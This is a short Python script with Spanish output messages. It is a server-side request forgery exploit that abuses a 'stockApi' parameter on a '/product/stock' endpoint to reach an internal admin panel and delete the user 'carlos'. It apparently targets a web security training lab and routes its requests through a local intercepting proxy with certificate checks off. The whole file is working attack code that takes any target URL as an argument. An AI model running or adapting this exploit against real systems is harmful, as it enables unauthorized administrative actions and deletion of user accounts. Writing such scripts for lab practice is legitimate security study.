import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies_setting = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def main():
    if len(sys.argv) !=2:
        print(f"(+) Uso: {sys.argv[0]} <url>")
        print(f"(+) Ejemplo: {sys.argv[0]} www.ejemplo.com")
        exit(-1)
    
    session = requests.session()
    base_url = sys.argv[1]
    delete_user(session,base_url,"carlos")
    
def delete_user(session,base_url,username):
    url_stock = f"{base_url}/product/stock"
    payload = f'http://localhost/admin/delete?username={username}'
    data_stockapi = {'stockApi': payload}
    response = session.post(url_stock,data_stockapi,verify=False,proxies=proxies_setting)
    
    url_admin = 'http://localhost/admin'
    data_stockapi = {'stockApi': url_admin}
    response = session.post(url_stock,data_stockapi,verify=False,proxies=proxies_setting)
    if "deleted successfully" in response.text:
        print(f"(+) Usuario {username} eliminado")
    else:
        print(f"(-) Exploit fallido")
    

if __name__ == "__main__":
    main()
